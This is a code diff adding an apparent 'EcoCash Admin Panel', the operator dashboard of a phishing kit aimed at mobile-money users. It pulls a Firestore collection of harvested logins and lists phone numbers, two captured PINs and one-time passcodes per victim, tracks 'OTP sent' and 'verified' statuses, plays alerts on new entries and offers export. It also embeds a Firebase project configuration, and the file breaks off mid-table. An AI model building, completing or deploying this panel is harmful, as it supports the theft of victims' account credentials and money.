@@ -1,0 +1,1443 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.5, user-scalable=yes">
+  <title>EcoCash Admin Panel</title>
+  
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+  
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    }
+    
+    body {
+      background: #f0f2f5;
+      min-height: 100vh;
+      padding: clamp(10px, 3vw, 20px);
+    }
+    
+    .container {
+      max-width: 1600px;
+      margin: 0 auto;
+      width: 100%;
+    }
+    
+    /* Header */
+    header {
+      background: linear-gradient(135deg, #1c6aa6, #125c9c);
+      color: white;
+      padding: clamp(15px, 4vw, 25px) clamp(20px, 4vw, 30px);
+      border-radius: clamp(8px, 2vw, 10px);
+      margin-bottom: clamp(15px, 3vw, 25px);
+      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+      display: flex;
+      flex-direction: row;
+      flex-wrap: wrap;
+      gap: 15px;
+      justify-content: space-between;
+      align-items: center;
+    }
+    
+    header h1 {
+      font-size: clamp(20px, 5vw, 28px);
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      flex-wrap: wrap;
+    }
+    
+    header h1 span:first-child { color: #ffd700; }
+    header h1 span:last-child { color: #ffffff; }
+    
+    .header-stats {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 15px;
+      align-items: center;
+    }
+    
+    .stats {
+      background: rgba(255,255,255,0.2);
+      padding: clamp(8px, 2vw, 10px) clamp(15px, 3vw, 20px);
+      border-radius: 8px;
+      font-size: clamp(14px, 3.5vw, 16px);
+      white-space: nowrap;
+    }
+    
+    /* Sound Toggle */
+    .sound-toggle {
+      background: rgba(255,255,255,0.2);
+      border: 1px solid rgba(255,255,255,0.3);
+      color: white;
+      padding: 8px 16px;
+      border-radius: 30px;
+      font-size: 14px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      transition: all 0.3s;
+    }
+    
+    .sound-toggle.active {
+      background: rgba(40, 167, 69, 0.3);
+      border-color: #28a745;
+    }
+    
+    .sound-toggle:hover {
+      background: rgba(255,255,255,0.3);
+    }
+    
+    /* Controls */
+    .controls {
+      background: white;
+      padding: clamp(15px, 3vw, 20px);
+      border-radius: clamp(8px, 2vw, 10px);
+      margin-bottom: clamp(15px, 3vw, 25px);
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+      display: flex;
+      flex-direction: row;
+      flex-wrap: wrap;
+      gap: 12px;
+      align-items: center;
+    }
+    
+    .search-box {
+      flex: 2;
+      min-width: 250px;
+      position: relative;
+    }
+    
+    .search-box input {
+      width: 100%;
+      padding: clamp(10px, 2.5vw, 12px) clamp(15px, 3vw, 15px);
+      padding-left: 40px;
+      border: 2px solid #e0e0e0;
+      border-radius: 8px;
+      font-size: clamp(14px, 3.5vw, 15px);
+      transition: border-color 0.3s;
+      -webkit-appearance: none;
+    }
+    
+    .search-box input:focus {
+      outline: none;
+      border-color: #1c6aa6;
+    }
+    
+    .search-box::before {
+      content: "🔍";
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 18px;
+      opacity: 0.6;
+      pointer-events: none;
+    }
+    
+    .filter-wrapper {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      flex: 1;
+      min-width: 200px;
+    }
+    
+    .filter-btn {
+      padding: clamp(8px, 2vw, 10px) clamp(12px, 2.5vw, 20px);
+      border: none;
+      border-radius: 6px;
+      font-size: clamp(13px, 3vw, 14px);
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s;
+      background: #f0f2f5;
+      color: #333;
+      white-space: nowrap;
+      flex: 1;
+      -webkit-tap-highlight-color: transparent;
+    }
+    
+    .filter-btn.active {
+      background: #1c6aa6;
+      color: white;
+    }
+    
+    .filter-btn:hover {
+      background: #e0e0e0;
+    }
+    
+    .filter-btn.active:hover {
+      background: #125c9c;
+    }
+    
+    .action-buttons {
+      display: flex;
+      flex-direction: row;
+      flex-wrap: nowrap;
+      gap: 8px;
+      margin-left: auto;
+    }
+    
+    .refresh-btn, .export-btn, .auto-refresh-btn {
+      padding: clamp(8px, 2vw, 10px) clamp(12px, 2.5vw, 20px);
+      border: none;
+      border-radius: 6px;
+      font-size: clamp(13px, 3vw, 14px);
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      white-space: nowrap;
+      -webkit-tap-highlight-color: transparent;
+      flex: 0 1 auto;
+      min-width: 0;
+    }
+    
+    .refresh-btn {
+      background: #28a745;
+      color: white;
+    }
+    
+    .refresh-btn:hover {
+      background: #218838;
+    }
+    
+    .export-btn {
+      background: #ffc107;
+      color: #333;
+    }
+    
+    .export-btn:hover {
+      background: #e0a800;
+    }
+    
+    .auto-refresh-btn {
+      background: #6c757d;
+      color: white;
+    }
+    
+    .auto-refresh-btn.active {
+      background: #28a745;
+    }
+    
+    .auto-refresh-btn:hover {
+      opacity: 0.9;
+    }
+    
+    /* Refresh Timer */
+    .refresh-timer {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      background: #f8f9fa;
+      padding: 5px 15px;
+      border-radius: 20px;
+      font-size: 14px;
+      color: #666;
+      margin-bottom: 15px;
+    }
+    
+    .timer-circle {
+      width: 30px;
+      height: 30px;
+      border-radius: 50%;
+      background: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: bold;
+      color: #1c6aa6;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    
+    .timer-progress {
+      width: 80px;
+      height: 4px;
+      background: #e0e0e0;
+      border-radius: 2px;
+      overflow: hidden;
+    }
+    
+    .timer-progress-bar {
+      height: 100%;
+      background: #1c6aa6;
+      width: 100%;
+      transition: width 1s linear;
+    }
+    
+    /* New Data Banner */
+    .new-data-banner {
+      background: linear-gradient(135deg, #ffd700, #ffc107);
+      color: #333;
+      padding: 12px 20px;
+      border-radius: 10px;
+      margin-bottom: 15px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 10px;
+      animation: pulse 2s infinite;
+      box-shadow: 0 4px 10px rgba(255, 193, 7, 0.3);
+    }
+    
+    @keyframes pulse {
+      0% { opacity: 1; }
+      50% { opacity: 0.9; }
+      100% { opacity: 1; }
+    }
+    
+    .new-data-banner .new-count {
+      font-size: 18px;
+      font-weight: bold;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    
+    .new-data-banner .new-count span {
+      background: #333;
+      color: white;
+      padding: 4px 12px;
+      border-radius: 20px;
+      font-size: 14px;
+    }
+    
+    .mark-seen-btn {
+      background: #333;
+      color: white;
+      border: none;
+      padding: 8px 20px;
+      border-radius: 30px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      white-space: nowrap;
+    }
+    
+    .mark-seen-btn:hover {
+      background: #000;
+      transform: translateY(-2px);
+    }
+    
+    /* Section Headers */
+    .section-header {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      padding: 15px 20px;
+      background: #f8f9fa;
+      border-bottom: 2px solid #1c6aa6;
+      margin-top: 20px;
+    }
+    
+    .section-header:first-of-type {
+      margin-top: 0;
+    }
+    
+    .section-header h2 {
+      font-size: 18px;
+      color: #1c6aa6;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    
+    .section-badge {
+      background: #1c6aa6;
+      color: white;
+      padding: 4px 12px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 600;
+    }
+    
+    .section-badge.new {
+      background: #ffc107;
+      color: #333;
+    }
+    
+    /* Table Container */
+    .table-container {
+      background: white;
+      border-radius: clamp(8px, 2vw, 10px);
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+      overflow-x: auto;
+      margin-bottom: clamp(15px, 3vw, 25px);
+      -webkit-overflow-scrolling: touch;
+    }
+    
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      min-width: 1000px; /* Larger min-width for more columns */
+    }
+    
+    thead {
+      background: #1c6aa6;
+      color: white;
+    }
+    
+    th {
+      padding: clamp(12px, 2.5vw, 15px);
+      text-align: left;
+      font-weight: 600;
+      font-size: clamp(13px, 3vw, 14px);
+      white-space: nowrap;
+    }
+    
+    td {
+      padding: clamp(10px, 2vw, 12px) clamp(10px, 2vw, 15px);
+      border-bottom: 1px solid #e0e0e0;
+      font-size: clamp(13px, 3vw, 14px);
+    }
+    
+    tbody tr:hover {
+      background: #f8f9fa;
+    }
+    
+    tbody tr:last-child td {
+      border-bottom: none;
+    }
+    
+    .phone-number {
+      font-family: 'Courier New', monospace;
+      font-weight: 600;
+      color: #1c6aa6;
+      font-size: clamp(13px, 3vw, 14px);
+      white-space: nowrap;
+    }
+    
+    .pin-display {
+      font-family: 'Courier New', monospace;
+      font-weight: 600;
+      letter-spacing: 2px;
+      color: #e12b2b;
+      font-size: clamp(13px, 3vw, 14px);
+    }
+    
+    .otp-display {
+      font-family: 'Courier New', monospace;
+      font-weight: 600;
+      letter-spacing: 2px;
+      color: #1c6aa6;
+      font-size: clamp(13px, 3vw, 14px);
+    }
+    
+    .timestamp {
+      color: #666;
+      font-size: clamp(12px, 2.8vw, 13px);
+      white-space: nowrap;
+    }
+    
+    .badge {
+      display: inline-block;
+      padding: 4px 8px;
+      border-radius: 4px;
+      font-size: clamp(11px, 2.5vw, 12px);
+      font-weight: 600;
+      white-space: nowrap;
+    }
+    
+    .badge-info {
+      background: #cce5ff;
+      color: #004085;
+    }
+    
+    .badge-new {
+      background: #ffd700;
+      color: #333;
+    }
+    
+    .badge-success {
+      background: #d4edda;
+      color: #155724;
+    }
+    
+    .badge-warning {
+      background: #fff3cd;
+      color: #856404;
+    }
+    
+    .badge-danger {
+      background: #f8d7da;
+      color: #721c24;
+    }
+    
+    .attempt-badge {
+      display: inline-block;
+      padding: 4px 8px;
+      border-radius: 12px;
+      font-size: 11px;
+      font-weight: 600;
+    }
+    
+    .attempt-1 {
+      background: #f8d7da;
+      color: #721c24;
+    }
+    
+    .attempt-2 {
+      background: #fff3cd;
+      color: #856404;
+    }
+    
+    .attempt-3 {
+      background: #d4edda;
+      color: #155724;
+    }
+    
+    /* Empty States */
+    .no-data {
+      text-align: center;
+      padding: clamp(40px, 10vw, 60px) 20px;
+      color: #666;
+      font-size: clamp(14px, 3.5vw, 16px);
+    }
+    
+    .no-data i {
+      font-size: clamp(40px, 10vw, 48px);
+      display: block;
+      margin-bottom: 15px;
+      opacity: 0.3;
+    }
+    
+    .loading {
+      text-align: center;
+      padding: clamp(40px, 10vw, 60px) 20px;
+    }
+    
+    .loading-spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #1c6aa6;
+      border-radius: 50%;
+      width: clamp(35px, 8vw, 40px);
+      height: clamp(35px, 8vw, 40px);
+      animation: spin 1s linear infinite;
+      margin: 0 auto 15px;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    .footer {
+      text-align: center;
+      color: #666;
+      font-size: clamp(12px, 3vw, 14px);
+      margin-top: 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 10px;
+    }
+    
+    .footer-left {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+    
+    .footer-right {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    
+    .delete-link {
+      color: #dc3545;
+      text-decoration: none;
+      font-weight: 600;
+      padding: 5px 10px;
+      border-radius: 5px;
+      transition: background 0.3s;
+    }
+    
+    .delete-link:hover {
+      background: #dc3545;
+      color: white;
+    }
+    
+    /* Mobile Optimizations */
+    @media (max-width: 768px) {
+      header {
+        flex-direction: column;
+        text-align: center;
+      }
+      
+      .header-stats {
+        width: 100%;
+        justify-content: center;
+      }
+      
+      .controls {
+        flex-direction: column;
+        align-items: stretch;
+      }
+      
+      .search-box {
+        width: 100%;
+      }
+      
+      .filter-wrapper {
+        width: 100%;
+      }
+      
+      .action-buttons {
+        width: 100%;
+        margin-left: 0;
+        justify-content: space-between;
+      }
+      
+      .refresh-btn, .export-btn, .auto-refresh-btn {
+        padding: 8px 10px;
+        font-size: 12px;
+        flex: 1;
+      }
+      
+      @media (max-width: 480px) {
+        .refresh-btn span:not(:first-child), 
+        .export-btn span:not(:first-child), 
+        .auto-refresh-btn span:not(:first-child) {
+          display: none;
+        }
+        
+        .refresh-btn, .export-btn, .auto-refresh-btn {
+          padding: 8px 5px;
+          justify-content: center;
+        }
+      }
+      
+      .table-container {
+        margin: 0 -5px;
+        border-radius: 0;
+      }
+      
+      th, td {
+        padding: 10px 8px;
+      }
+      
+      .footer {
+        flex-direction: column;
+        text-align: center;
+      }
+      
+      .footer-left, .footer-right {
+        width: 100%;
+        justify-content: center;
+      }
+      
+      .refresh-timer {
+        width: 100%;
+        justify-content: center;
+      }
+      
+      .new-data-banner {
+        flex-direction: column;
+        text-align: center;
+      }
+    }
+    
+    /* Small Mobile */
+    @media (max-width: 480px) {
+      body {
+        padding: 5px;
+      }
+      
+      .filter-wrapper {
+        flex-wrap: wrap;
+      }
+      
+      .filter-btn {
+        flex: 1 1 calc(50% - 4px);
+      }
+      
+      .action-buttons {
+        display: flex !important;
+        flex-direction: row !important;
+        flex-wrap: nowrap !important;
+        gap: 4px;
+      }
+      
+      .refresh-btn, .export-btn, .auto-refresh-btn {
+        width: auto;
+        flex: 1 1 0;
+        min-width: 40px;
+        padding: 8px 4px;
+        font-size: 11px;
+      }
+      
+      table {
+        min-width: 1000px;
+      }
+    }
+    
+    /* Touch-friendly */
+    button, .filter-btn {
+      touch-action: manipulation;
+    }
+    
+    /* Landscape mode */
+    @media (max-height: 500px) and (orientation: landscape) {
+      header {
+        padding: 10px 20px;
+      }
+      
+      .loading {
+        padding: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <h1>
+        <span>Eco</span><span>Cash</span> Admin Panel
+      </h1>
+      <div class="header-stats">
+        <div class="stats" id="stats">
+          Total: <span id="totalCount">0</span>
+        </div>
+        <button class="sound-toggle active" id="soundToggle">
+          <span id="soundIcon">🔊</span>
+          <span id="soundText">Sound On</span>
+        </button>
+      </div>
+    </header>
+    
+    <div class="controls">
+      <div class="search-box">
+        <input type="text" id="searchInput" placeholder="Search phone, PIN, or OTP..." enterkeyhint="search">
+      </div>
+      
+      <div class="filter-wrapper">
+        <button class="filter-btn active" data-filter="all">All</button>
+        <button class="filter-btn" data-filter="today">Today</button>
+        <button class="filter-btn" data-filter="week">Week</button>
+        <button class="filter-btn" data-filter="month">Month</button>
+      </div>
+      
+      <div class="action-buttons">
+        <button class="auto-refresh-btn" id="autoRefreshBtn">
+          <span>⏺</span> <span>Auto</span>
+        </button>
+        
+        <button class="refresh-btn" id="refreshBtn">
+          <span>↻</span> <span>Refresh</span>
+        </button>
+        
+        <button class="export-btn" id="exportBtn">
+          <span>📥</span> <span>Export</span>
+        </button>
+      </div>
+    </div>
+    
+    <!-- Refresh Timer -->
+    <div class="refresh-timer" id="refreshTimer" style="display: none;">
+      <div class="timer-circle" id="timerCircle">20</div>
+      <div class="timer-progress">
+        <div class="timer-progress-bar" id="timerBar" style="width: 100%;"></div>
+      </div>
+      <span>Auto-refresh in <span id="timerSeconds">20</span>s</span>
+    </div>
+    
+    <!-- New Data Banner -->
+    <div id="newDataBanner" class="new-data-banner" style="display: none;">
+      <div class="new-count">
+        <span>✨ NEW</span>
+        <span id="newDataCount">0</span> new entries found!
+      </div>
+      <button class="mark-seen-btn" id="markSeenBtn">
+        <span>✓</span> Mark as Seen
+      </button>
+    </div>
+    
+    <!-- New Data Section -->
+    <div id="newDataSection" style="display: none;">
+      <div class="section-header">
+        <h2>✨ New Entries <span class="section-badge new" id="newSectionCount">0</span></h2>
+      </div>
+      <div class="table-container">
+        <table>
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Phone Number</th>
+              <th>PIN 1</th>
+              <th>PIN 2</th>
+              <th>OTP</th>
+              <th>Attempt</th>
+              <th>Status</th>
+              <th>Date & Time</th>
+              <th>Device</th>
+            </tr>
+          </thead>
+          <tbody id="newTableBody"></tbody>
+        </table>
+      </div>
+    </div>
+    
+    <!-- All Data Section -->
+    <div id="allDataSection">
+      <div class="section-header">
+        <h2>📋 All Entries <span class="section-badge" id="allSectionCount">0</span></h2>
+      </div>
+      <div class="table-container">
+        <div id="loadingIndicator" class="loading">
+          <div class="loading-spinner"></div>
+          <p>Loading entries...</p>
+        </div>
+        
+        <div id="noDataMessage" class="no-data" style="display: none;">
+          <i>📭</i>
+          <p>No entries found</p>
+        </div>
+        
+        <table id="dataTable" style="display: none;">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Phone Number</th>
+              <th>PIN 1</th>
+              <th>PIN 2</th>
+              <th>OTP</th>
+              <th>Attempt</th>
+              <th>Status</th>
+              <th>Date & Time</th>
+              <th>Device</th>
+            </tr>
+          </thead>
+          <tbody id="tableBody">
+            <!-- Data will be inserted here -->
+          </tbody>
+        </table>
+      </div>
+    </div>
+    
+    <div class="footer">
+      <div class="footer-left">
+        <span>EcoCash Admin • <span id="updateTime"></span></span>
+      </div>
+      <div class="footer-right">
+        <a href="delete-data.html" class="delete-link" target="_blank">🗑️ Delete All Data</a>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      // ==================== FIREBASE CONFIG ====================
+      const firebaseConfig = {
+        apiKey: "AIzaSyBScpHGE2n7-qLHK5d_sqD165zMbFiP4NA",
+        authDomain: "eco-panel-3d06e.firebaseapp.com",
+        projectId: "eco-panel-3d06e",
+        storageBucket: "eco-panel-3d06e.firebasestorage.app",
+        messagingSenderId: "820242007704",
+        appId: "1:820242007704:web:c77e9610c3ac26a01e72ed"
+      };
+
+      // Initialize Firebase
+      firebase.initializeApp(firebaseConfig);
+      const db = firebase.firestore();
+      const COLLECTION_NAME = 'ecocash_logins';
+
+      // ==================== DOM ELEMENTS ====================
+      const tableBody = document.getElementById('tableBody');
+      const newTableBody = document.getElementById('newTableBody');
+      const loadingIndicator = document.getElementById('loadingIndicator');
+      const noDataMessage = document.getElementById('noDataMessage');
+      const dataTable = document.getElementById('dataTable');
+      const totalCountSpan = document.getElementById('totalCount');
+      const updateTimeSpan = document.getElementById('updateTime');
+      const searchInput = document.getElementById('searchInput');
+      const refreshBtn = document.getElementById('refreshBtn');
+      const exportBtn = document.getElementById('exportBtn');
+      const autoRefreshBtn = document.getElementById('autoRefreshBtn');
+      const filterBtns = document.querySelectorAll('.filter-btn');
+      
+      // New data elements
+      const newDataBanner = document.getElementById('newDataBanner');
+      const newDataSection = document.getElementById('newDataSection');
+      const newDataCount = document.getElementById('newDataCount');
+      const newSectionCount = document.getElementById('newSectionCount');
+      const markSeenBtn = document.getElementById('markSeenBtn');
+      const allSectionCount = document.getElementById('allSectionCount');
+      
+      // Sound toggle
+      const soundToggle = document.getElementById('soundToggle');
+      const soundIcon = document.getElementById('soundIcon');
+      const soundText = document.getElementById('soundText');
+      
+      // Timer elements
+      const refreshTimer = document.getElementById('refreshTimer');
+      const timerCircle = document.getElementById('timerCircle');
+      const timerBar = document.getElementById('timerBar');
+      const timerSeconds = document.getElementById('timerSeconds');
+
+      // ==================== STORAGE KEYS ====================
+      const STORAGE_KEYS = {
+        SEEN_ENTRIES: 'ecocash_seen_entries',
+        SOUND_ENABLED: 'ecocash_sound_enabled',
+        AUTO_REFRESH: 'ecocash_auto_refresh'
+      };
+
+      // ==================== STATE ====================
+      let allEntries = [];
+      let seenEntryIds = new Set();
+      let filteredEntries = [];
+      let currentFilter = 'all';
+      let searchTerm = '';
+      
+      // Auto-refresh state
+      let autoRefreshEnabled = false;
+      let refreshInterval = 20;
+      let timeLeft = refreshInterval;
+      let timerInterval = null;
+      
+      // Sound state
+      let soundEnabled = true;
+
+      // ==================== STORAGE FUNCTIONS ====================
+      function loadSeenEntries() {
+        try {
+          const saved = localStorage.getItem(STORAGE_KEYS.SEEN_ENTRIES);
+          if (saved) {
+            const seenArray = JSON.parse(saved);
+            seenEntryIds = new Set(seenArray);
+          }
+        } catch (e) {
+          console.log('Error loading seen entries:', e);
+          seenEntryIds = new Set();
+        }
+      }
+
+      function saveSeenEntries() {
+        try {
+          const seenArray = Array.from(seenEntryIds);
+          localStorage.setItem(STORAGE_KEYS.SEEN_ENTRIES, JSON.stringify(seenArray));
+        } catch (e) {
+          console.log('Error saving seen entries:', e);
+        }
+      }
+
+      function loadSettings() {
+        try {
+          const soundSaved = localStorage.getItem(STORAGE_KEYS.SOUND_ENABLED);
+          if (soundSaved !== null) {
+            soundEnabled = soundSaved === 'true';
+          }
+          
+          const autoSaved = localStorage.getItem(STORAGE_KEYS.AUTO_REFRESH);
+          if (autoSaved !== null) {
+            autoRefreshEnabled = autoSaved === 'true';
+          }
+        } catch (e) {
+          console.log('Error loading settings:', e);
+        }
+      }
+
+      function saveSoundSetting() {
+        localStorage.setItem(STORAGE_KEYS.SOUND_ENABLED, soundEnabled);
+      }
+
+      function saveAutoRefreshSetting() {
+        localStorage.setItem(STORAGE_KEYS.AUTO_REFRESH, autoRefreshEnabled);
+      }
+
+      // ==================== NOTIFICATION SOUND ====================
+      function playNotificationSound() {
+        if (!soundEnabled) return;
+        
+        try {
+          const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+          const oscillator = audioContext.createOscillator();
+          const gainNode = audioContext.createGain();
+          
+          oscillator.connect(gainNode);
+          gainNode.connect(audioContext.destination);
+          
+          oscillator.frequency.value = 800;
+          gainNode.gain.value = 0.1;
+          
+          oscillator.start();
+          oscillator.stop(audioContext.currentTime + 0.2);
+          
+          if (audioContext.state === 'suspended') {
+            audioContext.resume();
+          }
+        } catch (e) {
+          console.log('Audio not supported');
+        }
+      }
+
+      // ==================== AUTO-REFRESH FUNCTIONS ====================
+      function startTimer() {
+        if (timerInterval) clearInterval(timerInterval);
+        
+        timeLeft = refreshInterval;
+        updateTimerDisplay();
+        refreshTimer.style.display = 'flex';
+        
+        timerInterval = setInterval(() => {
+          timeLeft--;
+          updateTimerDisplay();
+          
+          if (timeLeft <= 0) {
+            timeLeft = refreshInterval;
+            fetchEntries();
+          }
+        }, 1000);
+      }
+      
+      function stopTimer() {
+        if (timerInterval) {
+          clearInterval(timerInterval);
+          timerInterval = null;
+        }
+        refreshTimer.style.display = 'none';
+      }
+      
+      function updateTimerDisplay() {
+        const percent = (timeLeft / refreshInterval) * 100;
+        timerCircle.textContent = timeLeft;
+        timerSeconds.textContent = timeLeft;
+        timerBar.style.width = percent + '%';
+      }
+      
+      function toggleAutoRefresh() {
+        autoRefreshEnabled = !autoRefreshEnabled;
+        saveAutoRefreshSetting();
+        
+        if (autoRefreshEnabled) {
+          autoRefreshBtn.classList.add('active');
+          autoRefreshBtn.innerHTML = '<span>⏹️</span> <span>Auto</span>';
+          startTimer();
+        } else {
+          autoRefreshBtn.classList.remove('active');
+          autoRefreshBtn.innerHTML = '<span>⏺</span> <span>Auto</span>';
+          stopTimer();
+        }
+      }
+
+      // ==================== SOUND TOGGLE ====================
+      function toggleSound() {
+        soundEnabled = !soundEnabled;
+        saveSoundSetting();
+        
+        if (soundEnabled) {
+          soundToggle.classList.add('active');
+          soundIcon.textContent = '🔊';
+          soundText.textContent = 'Sound On';
+        } else {
+          soundToggle.classList.remove('active');
+          soundIcon.textContent = '🔇';
+          soundText.textContent = 'Sound Off';
+        }
+      }
+
+      // ==================== HELPER FUNCTIONS ====================
+      function formatTimestamp(timestamp) {
+        if (!timestamp) return 'N/A';
+        
+        const date = timestamp.toDate();
+        const now = new Date();
+        const diffTime = Math.abs(now - date);
+        const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
+        
+        if (date.toDateString() === now.toDateString()) {
+          return `Today ${date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}`;
+        }
+        const yesterday = new Date(now);
+        yesterday.setDate(yesterday.getDate() - 1);
+        if (date.toDateString() === yesterday.toDateString()) {
+          return `Yesterday ${date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}`;
+        }
+        if (diffDays <= 7) {
+          return date.toLocaleDateString([], { weekday: 'short', hour: '2-digit', minute: '2-digit' });
+        }
+        return date.toLocaleDateString([], { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' });
+      }
+
+      function formatPhoneNumber(phone) {
+        if (!phone) return 'N/A';
+        
+        const cleaned = phone.replace(/\D/g, '');
+        
+        if (cleaned.startsWith('263') && cleaned.length === 12) {
+          const match = cleaned.match(/(\d{3})(\d{3})(\d{3})(\d{3})/);
+          if (match) {
+            return `+${match[1]} ${match[2]} ${match[3]} ${match[4]}`;
+          }
+        } else if (cleaned.startsWith('0') && cleaned.length === 10) {
+          const withoutZero = cleaned.substring(1);
+          const match = withoutZero.match(/(\d{3})(\d{3})(\d{3})/);
+          if (match) {
+            return `+263 ${match[1]} ${match[2]} ${match[3]}`;
+          }
+        } else if (cleaned.length === 9) {
+          const match = cleaned.match(/(\d{3})(\d{3})(\d{3})/);
+          if (match) {
+            return `+263 ${match[1]} ${match[2]} ${match[3]}`;
+          }
+        }
+        
+        return phone;
+      }
+
+      function getDeviceIcon(ua) {
+        if (!ua) return '🌐';
+        if (ua.includes('iPhone')) return '📱';
+        if (ua.includes('Android')) return '📱';
+        if (ua.includes('Mobile')) return '📱';
+        if (ua.includes('Windows')) return '💻';
+        if (ua.includes('Mac')) return '💻';
+        return '🌐';
+      }
+
+      function getStatusBadge(status) {
+        switch(status) {
+          case 'failed':
+            return '<span class="badge badge-danger">❌ Failed</span>';
+          case 'otp_sent':
+            return '<span class="badge badge-warning">📱 OTP Sent</span>';
+          case 'verified':
+            return '<span class="badge badge-success">✅ Verified</span>';
+          case 'otp_entered':
+            return '<span class="badge badge-info">🔑 OTP Entered</span>';
+          default:
+            return '<span class="badge badge-info">⏳ Pending</span>';
+        }
+      }
+
+      function getAttemptBadge(attempt) {
+        switch(attempt) {
+          case 1:
+            return '<span class="attempt-badge attempt-1">First Attempt</span>';
+          case 2:
+            return '<span class="attempt-badge attempt-2">Second Attempt</span>';
+          case 3:
+            return '<span class="attempt-badge attempt-3">OTP Attempt</span>';
+          default:
+            return '<span class="attempt-badge">Unknown</span>';
+        }
+      }
+
+      function filterEntriesByTime(entries, filter) {
+        const now = new Date();
+        const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
+        const weekAgo = new Date(now.getFullYear(), now.getMonth(), now.getDate() - 7);
+        const monthAgo = new Date(now.getFullYear(), now.getMonth() - 1, now.getDate());
+        
+        return entries.filter(entry => {
+          if (!entry.timestamp) return filter === 'all';
+          const entryDate = entry.timestamp.toDate();
+          
+          switch(filter) {
+            case 'today': return entryDate >= today;
+            case 'week': return entryDate >= weekAgo;
+            case 'month': return entryDate >= monthAgo;
+            default: return true;
+          }
+        });
+      }
+
+      function filterEntriesBySearch(entries, term) {
+        if (!term) return entries;
+        term = term.toLowerCase();
+        return entries.filter(entry => {
+          const phone = (entry.phoneNumber || '').toLowerCase();
+          const pin1 = (entry.pin1 || '').toLowerCase();
+          const pin2 = (entry.pin2 || '').toLowerCase();
+          const otp = (entry.otp || '').toLowerCase();
+          return phone.includes(term) || pin1.includes(term) || pin2.includes(term) || otp.includes(term);
+        });
+      }
+
+      function getUnseenEntries() {
+        return allEntries.filter(entry => !seenEntryIds.has(entry.id));
+      }
+
+      function displayAllEntries() {
+        let entries = filterEntriesByTime(allEntries, currentFilter);
+        entries = filterEntriesBySearch(entries, searchTerm);
+        filteredEntries = entries;
+        
+        totalCountSpan.textContent = allEntries.length;
+        allSectionCount.textContent = allEntries.length;
+        
+        if (loadingIndicator.style.display !== 'none') {
+          loadingIndicator.style.display = 'none';
+        }
+        
+        if (entries.length === 0) {
+          dataTable.style.display = 'none';
+          noDataMessage.style.display = 'block';
+        } else {
+          dataTable.style.display = 'table';
+          noDataMessage.style.display = 'none';
+          
+          tableBody.innerHTML = '';
+          entries.forEach((entry, index) => {
+            const row = document.createElement('tr');
+            const timestamp = entry.timestamp ? formatTimestamp(entry.timestamp) : 'N/A';
+            const formattedPhone = formatPhoneNumber(entry.phoneNumber);
+            const deviceIcon = getDeviceIcon(entry.userAgent);
+            const isUnseen = !seenEntryIds.has(entry.id);
+            
+            // Get the appropriate PIN and OTP values based on attempt
+            let pin1 = entry.pin1 || (entry.attempt === 1 ? entry.pin : '—');
+            let pin2 = entry.pin2 || (entry.attempt === 2 ? entry.pin : '—');
+            let otp = entry.otp || '—';
+            
+            // Handle legacy data that might have just 'pin' field
+            if (entry.pin && !entry.pin1 && !entry.pin2) {
+              if (entry.attempt === 1) pin1 = entry.pin;
+              else if (entry.attempt === 2) pin2 = entry.pin;
+            }
+            
+            row.innerHTML = `
+              <td>${index + 1}${isUnseen ? ' ✨' : ''}</td>
+              <td class="phone-number">${formattedPhone}</td>
+              <td class="pin-display">${pin1}</td>
+              <td class="pin-display">${pin2}</td>
+              <td class="otp-display">${otp}</td>
+              <td>${getAttemptBadge(entry.attempt)}</td>
+              <td>${getStatusBadge(entry.status)}</td>
+              <td class="timestamp">${timestamp}</td>
